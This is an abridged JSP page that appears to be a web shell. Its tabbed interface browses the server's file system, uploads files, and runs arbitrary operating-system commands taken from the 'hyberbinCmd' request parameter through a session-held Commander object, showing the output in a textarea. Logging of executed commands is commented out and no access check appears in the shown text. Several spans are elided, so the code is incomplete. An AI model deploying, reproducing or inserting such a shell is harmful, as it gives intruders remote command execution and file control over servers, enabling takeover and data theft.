<%@page import="com.huahuan.system.Commander"%>
<%
    /**
...
<%!    private final static int languageNo = 0; //语言版本，0 : 中文； 1：英文
    ...
    String[] authorInfo = {" <font color=red> HI!     </font>", " <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font>"};
...
<%    request.setCharacterEncoding("gb2312");
    ...
    Commander commander = (Commander) session.getAttribute("hyberbincmd");
    if (commander == null) {
        commander = new Commander();
        session.setAttribute("hyberbincmd", commander);
    }
...
//                HsojLogger.log(request, "上传文件"+fi.clientFileName);
            File f1 = fi.file;
...
<html>
    ...
    <body>
        ...
        <ul id="tablist">
            ...
            <li><a href="" onClick="return expandcontent('menu2', this)" theme="#EAEAFF"> <%=strCommand[languageNo]%> </a></li>
            <li><a href="" onClick="return expandcontent('menu3', this)" theme="#EAEAFF"> <%=strSysProperty[languageNo]%> </a></li>
            <li><a href="" onClick="return expandcontent('menu4', this)" theme="#EAEAFF"> <%=strHelp[languageNo]%> </a></li>
            ...
            try {
                ...
                for (int i = 0; i < list.length; i++) {
                    if (list[i].isDirectory()) {
                        String path = formatPath(list[i].getAbsolutePath());
                        sbFolder.append("<tr><td >&nbsp;</td><td>");
                        sbFolder.append("  <a href=\"javascript:doForm('','" + path + "','','" + strCmd + "','1','');\">");
        ...
        <DIV id="tabcontentcontainer">
            ...
            <div id="menu1" class="tabcontent">
                ...
                <table width="100%" border="1" cellspacing="0" cellpadding="5" bordercolorlight="#000000" bordercolordark="#FFFFFF">
                    ...
                    <form name="frmUpload" enctype="multipart/form-data" action="" target="nothingiframe" method="post">
                        ...
                        <input type="button" name="" value="刷新" onclick="javascript:doForm('','<%=strDir.replace("\\", "\\\\")%>','','','1','')"/>
                        </td></tr></form>
                </table>
                <iframe name="nothingiframe" style=" display: none" width="0" height="0"></iframe>
            </div>
            <div id="menu2" class="tabcontent">
                <%
                    String hyberbinCmd = request.getParameter("hyberbinCmd");
                    String submit = request.getParameter("submit");
                    if (submit != null && !submit.trim().equals("")) {
                        if (submit.equals("清屏")) {
                            commander.doClear();
                        } else if (submit.equals("退出")) {
                            commander.addLines("exit");
                            session.removeAttribute("hyberbincmd");
                        }
                    }
                    if (hyberbinCmd == null || hyberbinCmd.trim().equals("")) {
                        hyberbinCmd = "";
                    } else {
                        //    HsojLogger.log(request, "执行："+hyberbinCmd);
                        commander.addLines(hyberbinCmd);
                    }
                %>
                <form name="cmd" action="" method="post">
                    &nbsp;
                    <input type="text" id="hyberbinCmd" name="hyberbinCmd" value="" size=50>
                    <input type="hidden" name="tabID" value="2">
                    <input type=submit name=submit value="执行">
                    <input type=submit name=submit value="清屏">
                    <input type=submit name=submit value="退出">
                    <input type=submit name=submit value="刷新">
                </form>
                &nbsp;
                <textarea cols="80" rows="20" NAME="cqq" id="getOutString"><%=commander.getOutString()%></textarea>
                <br>&nbsp;
            </DIV>
        </div>
        <br><br>
        <center><a href="http://www.topronet.com" target="_blank">www.topronet.com</a> ,All Rights Reserved.
            ...
            <script>
                ...
                function sc(){
                    $("#hyberbinCmd").focus();
                    document.all.getOutString.scrollTop=document.all.getOutString.scrollHeight;
                }
